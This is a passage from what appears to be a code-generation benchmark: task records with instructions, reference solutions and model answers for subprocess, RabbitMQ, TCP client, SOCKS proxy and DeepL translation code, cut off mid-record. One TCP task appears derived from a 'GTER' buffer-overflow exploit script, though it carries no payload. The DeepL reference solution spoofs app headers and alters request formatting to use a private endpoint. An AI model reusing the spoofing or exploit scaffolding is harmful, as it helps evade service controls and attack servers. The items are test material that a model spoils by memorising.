    "Instruction": "Task Description: Create a function that uses subprocess.Popen with pipes to execute ffprobe (a multimedia stream analyzer) on a specified file and return the output in JSON format.\n\nFunction Description: The function _probe executes ffprobe command-line tool to analyze a multimedia file, capturing its format and stream information. It uses subprocess.Popen with pipes to handle inter-process communication, converts the output to JSON, and handles errors if the process fails.\n\nInput:\n- filename: [str] - Path to the multimedia file to analyze\n- cmd: [str] (optional, default=\"ffprobe\") - Name/path of the ffprobe executable\n- timeout: [int/float] (optional) - Timeout in seconds for the subprocess\n- **kwargs: [dict] (optional) - Additional ffprobe command-line arguments\n\nOutput:\n- [dict] - Parsed JSON output containing multimedia file information\n- Raises ffmpeg.Error if the process returns a non-zero exit code (includes stderr in exception)",
    "Canonical_solution": "import json\nimport subprocess\nimport ffmpeg\n\ndef _probe(filename, cmd=\"ffprobe\", timeout=None, **kwargs):\n    \"\"\"Run ffprobe on the specified file and return a JSON representation of the output.\n\n    Raises:\n        :class:`ffmpeg.Error`: if ffprobe returns a non-zero exit code,\n            an :class:`Error` is returned with a generic error message.\n            The stderr output can be retrieved by accessing the\n            ``stderr`` property of the exception.\n    \"\"\"\n    args = [cmd, \"-show_format\", \"-show_streams\", \"-of\", \"json\"]\n    args += ffmpeg._utils.convert_kwargs_to_cmd_line_args(kwargs)\n    args += [filename]\n\n    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    communicate_kwargs = {}\n    if timeout is not None:\n        communicate_kwargs[\"timeout\"] = timeout\n    out, err = p.communicate(**communicate_kwargs)\n    if p.returncode != 0:\n        raise ffmpeg.Error(\"ffprobe\", out, err)\n    return json.loads(out.decode(\"utf-8\"))",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport json\nimport shlex\n\nclass Error(Exception):\n    def __init__(self, stderr):\n        super().__init__(f\"FFmpeg error: {stderr}\")\n        self.stderr = stderr\n\ndef _probe(filename, cmd=\"ffprobe\", timeout=None, **kwargs):\n    args = [cmd, \"-v\", \"quiet\", \"-print_format\", \"json\", \"-show_format\", \"-show_streams\"]\n    for k, v in kwargs.items():\n        args.append(f\"-{k}\")\n        if v is not None:\n            args.append(str(v))\n    args.append(filename)\n\n    process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    \n    try:\n        stdout, stderr = process.communicate(timeout=timeout)\n    except subprocess.TimeoutExpired:\n        process.kill()\n        stdout, stderr = process.communicate()\n        raise TimeoutError(f\"ffprobe command timed out after {timeout} seconds\")\n\n    if process.returncode != 0:\n        raise Error(stderr.decode(\"utf-8\"))\n\n    return json.loads(stdout.decode(\"utf-8\"))"
  },
  {
    "Task_id": 312,
    "Instruction": "Task Description: Implement functions to execute system commands asynchronously and synchronously using subprocess.PIPE for inter-process communication.\n\nFunction Description: \n- run_command_async: Executes a system command asynchronously with configurable pipe settings for stdin, stdout, and stderr.\n- run_command: Executes a system command synchronously, handles input/output through pipes, and manages process lifecycle.\n\nInput:\n- run_command_async:\n  - cmd_args: [List[str]] - Command and arguments to execute\n  - pipe_stdin: [bool] - Whether to pipe stdin (default: True)\n  - pipe_stdout: [bool] - Whether to pipe stdout (default: False)\n  - pipe_stderr: [bool] - Whether to pipe stderr (default: False)\n  - quiet: [bool] - If True, pipes both stdout and stderr (default: False)\n\n- run_command:\n  - cmd_args: [List[str]] - Command and arguments to execute\n  - input: [Optional[bytes]] - Input data to send to process (default: None)\n  - pipe_stdin: [bool] - Whether to pipe stdin (default: True)\n  - pipe_stdout: [bool] - Whether to pipe stdout (default: False)\n  - pipe_stderr: [bool] - Whether to pipe stderr (default: False)\n  - quiet: [bool] - If True, pipes both stdout and stderr (default: False)\n\nOutput:\n- run_command_async: Returns a subprocess.Popen object representing the running process\n- run_command: Returns a tuple (stdout_data, stderr_data) containing the process output",
    "Canonical_solution": "import subprocess as sp\n\ndef run_command_async(cmd_args,\n                      pipe_stdin=True,\n                      pipe_stdout=False,\n                      pipe_stderr=False,\n                      quiet=False):\n    stdin_stream = sp.PIPE if pipe_stdin else None\n    stdout_stream = sp.PIPE if pipe_stdout or quiet else None\n    stderr_stream = sp.PIPE if pipe_stderr or quiet else None\n\n    return sp.Popen(\n        cmd_args,\n        stdin=stdin_stream,\n        stdout=stdout_stream,\n        stderr=stderr_stream,\n        close_fds=True)\n\ndef run_command(cmd_args,\n                input=None,\n                pipe_stdin=True,\n                pipe_stdout=False,\n                pipe_stderr=False,\n                quiet=False):\n    with run_command_async(\n            cmd_args,\n            pipe_stdin=pipe_stdin,\n            pipe_stdout=pipe_stdout,\n            pipe_stderr=pipe_stderr,\n            quiet=quiet) as proc:\n        stdout, stderr = proc.communicate(input)\n        retcode = proc.poll()\n\n        if retcode:\n            raise Exception('ffmpeg error: %s' % stderr)\n\n        if proc.stdout is not None:\n            proc.stdout.close()\n        if proc.stderr is not None:\n            proc.stderr.close()\n\n        return stdout, stderr",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nfrom typing import List, Optional, Tuple\n\ndef run_command_async(\n    cmd_args: List[str],\n    pipe_stdin: bool = True,\n    pipe_stdout: bool = False,\n    pipe_stderr: bool = False,\n    quiet: bool = False\n) -> subprocess.Popen:\n    stdin = subprocess.PIPE if pipe_stdin else None\n    stdout = subprocess.PIPE if pipe_stdout or quiet else None\n    stderr = subprocess.PIPE if pipe_stderr or quiet else None\n    return subprocess.Popen(cmd_args, stdin=stdin, stdout=stdout, stderr=stderr)\n\ndef run_command(\n    cmd_args: List[str],\n    input: Optional[bytes] = None,\n    pipe_stdin: bool = True,\n    pipe_stdout: bool = False,\n    pipe_stderr: bool = False,\n    quiet: bool = False\n) -> Tuple[Optional[bytes], Optional[bytes]]:\n    stdin = subprocess.PIPE if pipe_stdin and input is not None else None\n    stdout = subprocess.PIPE if pipe_stdout or quiet else None\n    stderr = subprocess.PIPE if pipe_stderr or quiet else None\n    \n    process = subprocess.Popen(cmd_args, stdin=stdin, stdout=stdout, stderr=stderr)\n    stdout_data, stderr_data = process.communicate(input=input)\n    \n    return (stdout_data, stderr_data)"
  },
  {
    "Task_id": 314,
    "Instruction": "Task Description: Create a Python function that consumes messages from a RabbitMQ queue using the pika library, processing each message with a callback function.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, declares a durable queue, and starts consuming messages from the specified queue. Each received message is processed by a callback function that prints the message body. The function runs in a blocking mode, continuously waiting for messages until interrupted.\n\nInput:\n- port: [int] - The port number of the RabbitMQ server to connect to (default is typically 5672)\n\nOutput: None (The function runs indefinitely until interrupted, printing received messages to the console)",
    "Canonical_solution": "from multiprocessing import Process\nimport pika\n\ndef callback(ch, method, properties, body):\n    print(\" [x] Received %r\" % body.decode())\n\ndef receiver(port):\n    connection = pika.BlockingConnection(\n        pika.ConnectionParameters(host='localhost', port=port))\n    channel = connection.channel()\n    channel.queue_declare(queue='cryptofeed', durable=True)\n    channel.basic_consume(queue='cryptofeed',\n                          on_message_callback=callback, auto_ack=True)\n    print(' [*] Waiting for messages. To exit press CTRL+C')\n    channel.start_consuming()\n\nif __name__ == '__main__':\n    p = Process(target=receiver, args=(5672,))\n    p.start()",
    "Code_level": "Function-level",
    "FSMID_for_test": 77,
    "right_result": "import pika\nimport sys\n\ndef consume_messages(port=5672):\n    credentials = pika.PlainCredentials('guest', 'guest')\n    parameters = pika.ConnectionParameters('localhost', port, '/', credentials)\n    connection = pika.BlockingConnection(parameters)\n    channel = connection.channel()\n\n    queue_name = 'task_queue'\n    channel.queue_declare(queue=queue_name, durable=True)\n\n    def callback(ch, method, properties, body):\n        print(f\" [x] Received {body}\")\n        ch.basic_ack(delivery_tag=method.delivery_tag)\n\n    channel.basic_consume(queue=queue_name, on_message_callback=callback)\n    print(' [*] Waiting for messages. To exit press CTRL+C')\n    try:\n        channel.start_consuming()\n    except KeyboardInterrupt:\n        channel.stop_consuming()\n        connection.close()\n        sys.exit(0)"
  },
  {
    "Task_id": 315,
    "Instruction": "Task Description: Implement a RabbitMQ consumer function in Python that connects to a RabbitMQ server, declares a queue, and processes incoming messages using a callback function. The function should handle message acknowledgment and print the received messages.\n\nFunction Description: The function establishes a connection to a RabbitMQ server using blocking connection, declares a specified queue, and sets up a callback function to process incoming messages. The callback function parses the message body using Pydantic's BaseModel and acknowledges the message upon successful processing.\n\nInput: \n- None (The function uses hardcoded connection parameters and queue name)\n\nOutput: \n- None (The function prints received messages to the console and runs indefinitely in a blocking consumption loop)\n\nNote: The function does not explicitly return any value but continuously processes messages from the specified RabbitMQ queue until interrupted. The callback function prints both the parsed message (as a Pydantic model) and the raw message body.",
    "Canonical_solution": "import pika\nfrom pydantic import BaseModel\n\ndef rabbitmq_consumer():\n    credentials = pika.PlainCredentials(\"admin\", \"admin\")\n    connection = pika.BlockingConnection(pika.ConnectionParameters('127.0.0.1', credentials=credentials))\n    channel = connection.channel()\n    channel.queue_declare(queue=\"\u6c34\u8bb8\u4f20\")\n\n    def callbak(ch, method, properties, body):\n        class Test(BaseModel):\n            name: str\n            age: int\n        print(Test.parse_raw(body))\n        print(\"\u6d88\u8d39\u8005\u63a5\u6536\u5230\u4e86\u4efb\u52a1\uff1a%r\" % body.decode(\"utf8\"))\n        ch.basic_ack(delivery_tag=method.delivery_tag)\n\n    channel.basic_consume(on_message_callback=callbak, queue=\"\u6c34\u8bb8\u4f20\", auto_ack=False)\n    channel.start_consuming()",
    "Code_level": "Function-level",
    "FSMID_for_test": 77,
    "right_result": "import pika\nfrom pydantic import BaseModel\n\nclass MessageModel(BaseModel):\n    content: str\n\ndef start_consumer():\n    connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))\n    channel = connection.channel()\n    channel.queue_declare(queue='test_queue')\n\n    def callback(ch, method, properties, body):\n        try:\n            parsed_message = MessageModel.parse_raw(body)\n            print(f\"Received (parsed): {parsed_message}\")\n            print(f\"Received (raw): {body.decode()}\")\n            ch.basic_ack(delivery_tag=method.delivery_tag)\n        except Exception as e:\n            print(f\"Error processing message: {e}\")\n            ch.basic_nack(delivery_tag=method.delivery_tag, requeue=False)\n\n    channel.basic_consume(queue='test_queue', on_message_callback=callback)\n    print('Waiting for messages...')\n    channel.start_consuming()\n\nif __name__ == '__main__':\n    start_consumer()"
  },
  {
    "Task_id": 316,
    "Instruction": "Task Description: Implement a RabbitMQ message consumer function in Python using the pika library to receive and process messages from a specified queue.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, declares a topic exchange and a queue, binds them together, and starts consuming messages. Each received message is processed by a callback function that prints the message body.\n\nInput:\n- port: [int] - The port number of the RabbitMQ server to connect to (default is typically 5672)\n\nOutput: None (The function runs indefinitely, consuming messages until interrupted)",
    "Canonical_solution": "import pika\nfrom multiprocessing import Process\n\ndef callback(ch, method, properties, body):\n    print(\" [x] Received %r\" % body.decode())\n\ndef receiver(port):\n    connection = pika.BlockingConnection(\n        pika.ConnectionParameters(host='localhost', port=port))\n    channel = connection.channel()\n    exchange_name = 'amq.topic'\n    exchange_type = 'topic'\n    channel.exchange_declare(exchange=exchange_name, exchange_type=exchange_type, durable=True)\n    queue_name = 'cryptofeed'\n    channel.queue_declare(queue=queue_name)\n    channel.queue_bind(exchange=exchange_name, queue=queue_name)\n    channel.basic_consume(queue=queue_name, on_message_callback=callback, auto_ack=True)\n    print(' [*] Waiting for messages. To exit press CTRL+C')\n    channel.start_consuming()",
    "Code_level": "Function-level",
    "FSMID_for_test": 77,
    "right_result": "import pika\nimport sys\n\ndef consume_messages(port=5672):\n    connection = pika.BlockingConnection(pika.ConnectionParameters('localhost', port))\n    channel = connection.channel()\n\n    exchange_name = 'topic_logs'\n    queue_name = 'task_queue'\n\n    channel.exchange_declare(exchange=exchange_name, exchange_type='topic')\n    result = channel.queue_declare(queue=queue_name, durable=True)\n    channel.queue_bind(exchange=exchange_name, queue=queue_name, routing_key='*.*')\n\n    def callback(ch, method, properties, body):\n        print(f\" [x] Received {body}\")\n        ch.basic_ack(delivery_tag=method.delivery_tag)\n\n    channel.basic_consume(queue=queue_name, on_message_callback=callback)\n    print(' [*] Waiting for messages. To exit press CTRL+C')\n    channel.start_consuming()"
  },
  {
    "Task_id": 317,
    "Instruction": "Task Description: Implement a RabbitMQ consumer function in Python that listens to a specified queue, processes incoming messages by syncing them to either a MongoDB or Redis database based on configuration, and acknowledges successful processing.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, declares a durable queue, sets up a callback function to handle incoming messages, and starts consuming messages in a blocking loop. The callback function processes each message by syncing it to the configured database (MongoDB or Redis) and sends an acknowledgment back to RabbitMQ upon successful processing.\n\nInput: None (All configuration parameters are expected to be available in a config module:\n- config.rabbitmq_user: RabbitMQ username\n- config.rabbitmq_pass: RabbitMQ password\n- config.rabbitmq_host: RabbitMQ host address\n- config.rabbitmq_port: RabbitMQ port\n- config.rabbitmq_queue_name: Name of the queue to consume from\n- config.sync_db: Database type ('mongo' or 'redis') to sync data to)\n\nOutput: None (The function runs indefinitely, consuming messages from RabbitMQ and syncing them to the configured database)",
    "Canonical_solution": "import os\nimport pika\nimport config\nif config.sync_db=='mongo':\n    import sync_mongo as sync_data\nelse:\n    import sync_redis as sync_data\n\ndef consumer_data():\n    credentials = pika.PlainCredentials(config.rabbitmq_user, config.rabbitmq_pass)\n    parameters = pika.ConnectionParameters(config.rabbitmq_host, config.rabbitmq_port,'/',credentials)\n    connection = pika.BlockingConnection(parameters)\n    channel = connection.channel()\n    channel.queue_declare(queue=config.rabbitmq_queue_name, durable=True)\n\n    def callback(ch, method, properties, body):\n        ack = sync_data.set_data(body)\n        ch.basic_ack(delivery_tag = method.delivery_tag)\n\n    channel.basic_qos(prefetch_count=1)\n    channel.basic_consume(callback, \n                        queue=config.rabbitmq_queue_name,\n                        )\n    channel.start_consuming()",
    "Code_level": "Function-level",
    "FSMID_for_test": 77,
    "right_result": "import pika\nimport json\nfrom pymongo import MongoClient\nimport redis\nimport config\n\ndef start_consumer():\n    credentials = pika.PlainCredentials(config.rabbitmq_user, config.rabbitmq_pass)\n    parameters = pika.ConnectionParameters(host=config.rabbitmq_host, port=config.rabbitmq_port, credentials=credentials)\n    connection = pika.BlockingConnection(parameters)\n    channel = connection.channel()\n\n    channel.queue_declare(queue=config.rabbitmq_queue_name, durable=True)\n\n    if config.sync_db == 'mongo':\n        client = MongoClient(config.mongo_uri)\n        db = client[config.mongo_db]\n        collection = db[config.mongo_collection]\n    elif config.sync_db == 'redis':\n        redis_client = redis.StrictRedis(host=config.redis_host, port=config.redis_port, db=config.redis_db)\n\n    def callback(ch, method, properties, body):\n        try:\n            data = json.loads(body)\n            if config.sync_db == 'mongo':\n                collection.insert_one(data)\n            elif config.sync_db == 'redis':\n                redis_client.set(data['id'], json.dumps(data))\n            ch.basic_ack(delivery_tag=method.delivery_tag)\n        except Exception as e:\n            print(f\"Error processing message: {e}\")\n\n    channel.basic_consume(queue=config.rabbitmq_queue_name, on_message_callback=callback)\n    channel.start_consuming()"
  },
  {
    "Task_id": 32,
    "Instruction": "Task Description: Implement a function to translate text using the DeepL API with HTTP client functionality, supporting multiple language translations and alternative translations.\n\nFunction Description: The function uses the httpx library to send HTTP POST requests to the DeepL API endpoint. It handles text translation between specified source and target languages, with options for requesting alternative translations and proxy support. The function includes error handling for HTTP status codes and processes the JSON response to extract translated text.\n\nInput:\n- text: (str) - The text to be translated\n- sourceLang: (str, optional) - Source language code (auto-detected if None)\n- targetLang: (str, optional) - Target language code (defaults to \"EN\")\n- numberAlternative: (int, optional) - Number of alternative translations to request (0-3)\n- printResult: (bool, optional) - Whether to print the translation result\n- proxies: (dict, optional) - Proxy configuration for the HTTP client\n\nOutput:\n- If numberAlternative <= 1: returns (str) - The translated text\n- If numberAlternative > 1: returns (list[str]) - List of alternative translations\n- Returns None if HTTP request fails (non-200 status)\n- Raises TooManyRequestsException on HTTP 429 status",
    "Canonical_solution": "import random\nimport time\nimport json\nimport httpx\nfrom langdetect import detect\n\ndeeplAPI = \"https://www2.deepl.com/jsonrpc\"\nheaders = {\n    \"Content-Type\": \"application/json\",\n    \"Accept\": \"*/*\",\n    \"x-app-os-name\": \"iOS\",\n    \"x-app-os-version\": \"16.3.0\",\n    \"Accept-Language\": \"en-US,en;q=0.9\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"x-app-device\": \"iPhone13,2\",\n    \"User-Agent\": \"DeepL-iOS/2.9.1 iOS 16.3.0 (iPhone13,2)\",\n    \"x-app-build\": \"510265\",\n    \"x-app-version\": \"2.9.1\",\n    \"Connection\": \"keep-alive\",\n}\n\ndef translate(\n    text,\n    sourceLang=None,\n    targetLang=None,\n    numberAlternative=0,\n    printResult=False,\n    proxies=None,\n):\n    iCount = getICount(text)\n    id = getRandomNumber()\n\n    if sourceLang is None:\n        sourceLang = detectLang(text)\n    if targetLang is None:\n        targetLang = \"EN\"\n\n    numberAlternative = max(min(3, numberAlternative), 0)\n\n    postData = {\n        \"jsonrpc\": \"2.0\",\n        \"method\": \"LMT_handle_texts\",\n        \"id\": id,\n        \"params\": {\n            \"texts\": [{\"text\": text, \"requestAlternatives\": numberAlternative}],\n            \"splitting\": \"newlines\",\n            \"lang\": {\n                \"source_lang_user_selected\": sourceLang,\n                \"target_lang\": targetLang,\n            },\n            \"timestamp\": getTimestamp(iCount),\n            \"commonJobParams\": {\n                \"wasSpoken\": False,\n                \"transcribe_as\": \"\",\n            },\n        },\n    }\n    postDataStr = json.dumps(postData, ensure_ascii=False)\n\n    if (id + 5) % 29 == 0 or (id + 3) % 13 == 0:\n        postDataStr = postDataStr.replace('\"method\":\"', '\"method\" : \"', -1)\n    else:\n        postDataStr = postDataStr.replace('\"method\":\"', '\"method\": \"', -1)\n\n    with httpx.Client(proxies=proxies) as client:\n        resp = client.post(url=deeplAPI, data=postDataStr, headers=headers)\n        respStatusCode = resp.status_code\n\n        if respStatusCode == 429:\n            raise TooManyRequestsException\n            return \n\n        if respStatusCode != 200:\n            print(\"Error\", respStatusCode)\n            return\n\n        respText = resp.text\n        respJson = json.loads(respText)\n\n        if numberAlternative <= 1:\n            targetText = respJson[\"result\"][\"texts\"][0][\"text\"]\n            if printResult:\n                print(targetText)\n            return targetText\n\n        targetTextArray = []\n        for item in respJson[\"result\"][\"texts\"][0][\"alternatives\"]:\n            targetTextArray.append(item[\"text\"])\n            if printResult:\n                print(item[\"text\"])\n\n        return targetTextArray",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "right_result": "import httpx\nimport os\nfrom typing import Optional, Union, List, Dict\n\nclass TooManyRequestsException(Exception):\n    pass\n\ndef translate_text(\n    text: str,\n    sourceLang: Optional[str] = None,\n    targetLang: Optional[str] = \"EN\",\n    numberAlternative: Optional[int] = 0,\n    printResult: Optional[bool] = False,\n    proxies: Optional[Dict] = None\n) -> Union[str, List[str], None]:\n    \n    auth_key = os.getenv(\"DEEPL_AUTH_KEY\")\n    if not auth_key:\n        raise ValueError(\"DEEPL_AUTH_KEY environment variable not set\")\n\n    url = \"https://api-free.deepl.com/v2/translate\"\n    \n    headers = {\n        \"Authorization\": f\"DeepL-Auth-Key {auth_key}\",\n        \"Content-Type\": \"application/json\"\n    }\n\n    data = {\n        \"text\": [text],\n        \"target_lang\": targetLang\n    }\n\n    if sourceLang:\n        data[\"source_lang\"] = sourceLang\n\n    if numberAlternative > 0:\n        data[\"num_alternatives\"] = numberAlternative\n\n    with httpx.Client(proxies=proxies) as client:\n        response = client.post(url, headers=headers, json=data)\n    \n    if response.status_code == 429:\n        raise TooManyRequestsException(\"Too many requests. Please try again later.\")\n    \n    if response.status_code != 200:\n        return None\n    \n    result = response.json()\n    translations = result.get(\"translations\", [])\n    \n    if not translations:\n        return None\n    \n    translated_texts = []\n    for translation in translations:\n        alternatives = translation.get(\"alternatives\", [])\n        if alternatives:\n            translated_texts.extend([alt.get(\"text\") for alt in alternatives])\n        else:\n            translated_texts.append(translation.get(\"text\", \"\"))\n    \n    if printResult:\n        if numberAlternative <= 1:\n            print(f\"Translation: {translated_texts[0]}\")\n        else:\n            print(\"Alternative Translations:\")\n            for i, t in enumerate(translated_texts):\n                print(f\"{i+1}. {t}\")\n    \n    if numberAlternative <= 1:\n        return translated_texts[0]\n    else:\n        return translated_texts"
  },
  {
    "Task_id": 320,
    "Instruction": "Task Description: Create a TCP client function that establishes a connection to a server, sends a message, and receives a response.\n\nFunction Description: The function creates a TCP socket, connects to a specified server, sends a UTF-8 encoded message, receives a response, and then closes the connection. It handles the basic TCP client-server interaction.\n\nInput:\n- host: str - The IP address or hostname of the target server\n- port: int - The port number on which the server is listening\n- message: str - The message to be sent to the server\n\nOutput:\n- str - The decoded response received from the server",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host: str, port: int, message: str):\n    \"\"\"\n    TCP client interaction function that sends a message to server and receives response\n    \n    Args:\n        host: Server host address\n        port: Server port number\n        message: Message to send to server\n        \n    Returns:\n        The response received from server\n    \"\"\"\n    # Create TCP socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    # Connect to server\n    s.connect((host, port))\n    \n    # Send message\n    len_sent = s.send(message.encode('utf-8'))\n    \n    # Receive response\n    response = s.recv(1024)\n    \n    # Clean up\n    s.close()\n    \n    return response.decode('utf-8')",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef tcp_client(host: str, port: int, message: str) -> str:\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        client_socket.connect((host, port))\n        client_socket.sendall(message.encode('utf-8'))\n        response = client_socket.recv(1024)\n        return response.decode('utf-8')\n    finally:\n        client_socket.close()"
  },
  {
    "Task_id": 321,
    "Instruction": "Task Description: Create a Python function that implements a TCP client to interact with a server by sending a command with an offset and receiving the server's response.\n\nFunction Description: The function `tcp_client_interaction` establishes a TCP connection to a specified server, sends a command concatenated with an offset, receives the server's initial response, and then closes the connection. This is useful for basic client-server communication over TCP/IPv4.\n\nInput:\n- `host` (str): The IP address or hostname of the target server.\n- `port` (int): The port number on which the server is listening.\n- `cmd` (str): The command to be sent to the server.\n- `offset` (str): An offset value to be appended to the command.\n\nOutput:\n- The function prints the server's initial response to the console.\n- The function prints a confirmation message (\"Done Sending GTER with buffer\") upon successful completion.",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, cmd, offset):\n    buffer = cmd + offset + '\\r\\n'\n    \n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    data = s.recv(1024)\n    print \"\\n\" + data\n    s.send(buffer)\n    s.close()\n    print \"Done Sending GTER with buffer\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef tcp_client_interaction(host, port, cmd, offset):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        payload = cmd.encode() + offset.encode()\n        s.sendall(payload)\n        response = s.recv(1024).decode()\n        print(response)\n        s.close()\n        print(\"Done Sending GTER with buffer\")\n    except Exception as e:\n        print(f\"Error: {e}\")"
  },
  {
    "Task_id": 322,
    "Instruction": "Task Description: Create a SOCKS-enabled socket class that extends Python's built-in socket functionality to support proxy connections through SOCKS4, SOCKS5, and HTTP proxies.\n\nClass Description: The `socksocket` class extends Python's `socket.socket` class to provide proxy support. It handles connection establishment through various proxy types while maintaining standard socket functionality. The class manages proxy configuration, connection negotiation, and error handling for proxy-related operations.\n\nAttributes:\n- default_proxy: [Class Variable] - Default proxy configuration used when no specific proxy is set\n- _proxyconn: [socket.socket] - TCP connection used to maintain UDP relay (for SOCKS5 UDP)\n- proxy: [tuple] - Current proxy configuration (type, addr, port, rdns, username, password)\n- proxy_sockname: [tuple] - The bound address (IP, port) of the proxy connection\n- proxy_peername: [tuple] - The destination address (IP, port) through the proxy\n- _timeout: [float] - Socket timeout value\n\nMethods:\n- __init__(family, type, proto, *args, **kwargs) -> None - Initializes the socket with optional proxy support. Validates socket type and sets up proxy attributes.\n- set_proxy(proxy_type, addr, port, rdns, username, password) -> None - Configures proxy settings for the socket.\n- connect(dest_pair) -> None - Establishes connection to destination through configured proxy. Handles both direct and proxied connections.\n- _readall(file, count) -> bytes - Internal method to read exact number of bytes from a file object.\n- _proxy_addr() -> tuple - Internal method to resolve proxy address and port.\n- _negotiate_SOCKS4(dest_addr, dest_port) -> None - Internal method to handle SOCKS4 proxy negotiation.\n- _negotiate_SOCKS5(dest_addr, dest_port) -> None - Internal method to handle SOCKS5 proxy negotiation.\n- _negotiate_HTTP(dest_addr, dest_port) -> None - Internal method to handle HTTP proxy negotiation.",
    "Canonical_solution": "import socket\nfrom errno import EOPNOTSUPP, EINVAL, EAGAIN\nimport struct\nfrom io import BytesIO\nfrom base64 import b64encode\n\nclass socksocket(socket.socket):\n    \"\"\"socksocket([family[, type[, proto]]]) -> socket object\n\n    Open a SOCKS enabled socket. The parameters are the same as\n    those of the standard socket init. In order for SOCKS to work,\n    you must specify family=AF_INET and proto=0.\n    The \"type\" argument must be either SOCK_STREAM or SOCK_DGRAM.\n    \"\"\"\n\n    default_proxy = None\n\n    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM,\n                 proto=0, *args, **kwargs):\n        if type not in (socket.SOCK_STREAM, socket.SOCK_DGRAM):\n            msg = \"Socket type must be stream or datagram, not {!r}\"\n            raise ValueError(msg.format(type))\n\n        super(socksocket, self).__init__(family, type, proto, *args, **kwargs)\n        self._proxyconn = None  # TCP connection to keep UDP relay alive\n\n        if self.default_proxy:\n            self.proxy = self.default_proxy\n        else:\n            self.proxy = (None, None, None, None, None, None)\n        self.proxy_sockname = None\n        self.proxy_peername = None\n\n        self._timeout = None\n\n    def _readall(self, file, count):\n        \"\"\"Receive EXACTLY the number of bytes requested from the file object.\"\"\"\n        data = b\"\"\n        while len(data) < count:\n            d = file.read(count - len(data))\n            if not d:\n                raise GeneralProxyError(\"Connection closed unexpectedly\")\n            data += d\n        return data\n\n    def set_proxy(self, proxy_type=None, addr=None, port=None, rdns=True,\n                  username=None, password=None):\n        \"\"\"Sets the proxy to be used.\"\"\"\n        self.proxy = (proxy_type, addr, port, rdns,\n                      username.encode() if username else None,\n                      password.encode() if password else None)\n\n    def connect(self, dest_pair):\n        \"\"\"\n        Connects to the specified destination through a proxy.\n        Uses the same API as socket's connect().\n\n        dest_pair - 2-tuple of (IP/hostname, port).\n        \"\"\"\n        if len(dest_pair) != 2 or dest_pair[0].startswith(\"[\"):\n            raise socket.error(\"PySocks doesn't support IPv6: %s\" % str(dest_pair))\n\n        dest_addr, dest_port = dest_pair\n\n        if self.type == socket.SOCK_DGRAM:\n            if not self._proxyconn:\n                self.bind((\"\", 0))\n            dest_addr = socket.gethostbyname(dest_addr)\n\n            if dest_addr == \"0.0.0.0\" and not dest_port:\n                self.proxy_peername = None\n            else:\n                self.proxy_peername = (dest_addr, dest_port)\n            return\n\n        (proxy_type, proxy_addr, proxy_port, rdns, username,\n         password) = self.proxy\n\n        if (not isinstance(dest_pair, (list, tuple))\n                or len(dest_pair) != 2\n                or not dest_addr\n                or not isinstance(dest_port, int)):\n            raise GeneralProxyError(\n                \"Invalid destination-connection (host, port) pair\")\n\n        super(socksocket, self).settimeout(self._timeout)\n\n        if proxy_type is None:\n            self.proxy_peername = dest_pair\n            super(socksocket, self).settimeout(self._timeout)\n            super(socksocket, self).connect((dest_addr, dest_port))\n            return\n\n        proxy_addr = self._proxy_addr()\n\n        try:\n            super(socksocket, self).connect(proxy_addr)\n        except socket.error as error:\n            self.close()\n            proxy_addr, proxy_port = proxy_addr\n            proxy_server = \"{0}:{1}\".format(proxy_addr, proxy_port)\n            printable_type = PRINTABLE_PROXY_TYPES[proxy_type]\n\n            msg = \"Error connecting to {0} proxy {1}\".format(printable_type,\n                                                             proxy_server)\n            raise ProxyConnectionError(msg, error)\n        else:\n            try:\n                negotiate = self._proxy_negotiators[proxy_type]\n                negotiate(self, dest_addr, dest_port)\n            except socket.error as error:\n                self.close()\n                raise GeneralProxyError(\"Socket error\", error)\n            except ProxyError:\n                self.close()\n                raise\n\n    def _proxy_addr(self):\n        \"\"\"Return proxy address to connect to as tuple object\"\"\"\n        (proxy_type, proxy_addr, proxy_port, rdns, username,\n         password) = self.proxy\n        proxy_port = proxy_port or DEFAULT_PORTS.get(proxy_type)\n        if not proxy_port:\n            raise GeneralProxyError(\"Invalid proxy type\")\n        return proxy_addr, proxy_port\n\n    def _negotiate_SOCKS5(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through a SOCKS5 server.\"\"\"\n        self.proxy_peername, self.proxy_sockname = self._SOCKS5_request(\n            self, b\"\\x01\", (dest_addr, dest_port))\n\n    def _negotiate_SOCKS4(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through a SOCKS4 server.\"\"\"\n        proxy_type, addr, port, rdns, username, password = self.proxy\n\n        writer = self.makefile(\"wb\")\n        reader = self.makefile(\"rb\", 0)\n        try:\n            remote_resolve = False\n            try:\n                addr_bytes = socket.inet_aton(dest_addr)\n            except socket.error:\n                if rdns:\n                    addr_bytes = b\"\\x00\\x00\\x00\\x01\"\n                    remote_resolve = True\n                else:\n                    addr_bytes = socket.inet_aton(\n                        socket.gethostbyname(dest_addr))\n\n            writer.write(struct.pack(\">BBH\", 0x04, 0x01, dest_port))\n            writer.write(addr_bytes)\n\n            if username:\n                writer.write(username)\n            writer.write(b\"\\x00\")\n\n            if remote_resolve:\n                writer.write(dest_addr.encode(\"idna\") + b\"\\x00\")\n            writer.flush()\n\n            resp = self._readall(reader, 8)\n            if resp[0:1] != b\"\\x00\":\n                raise GeneralProxyError(\n                    \"SOCKS4 proxy server sent invalid data\")\n\n            status = ord(resp[1:2])\n            if status != 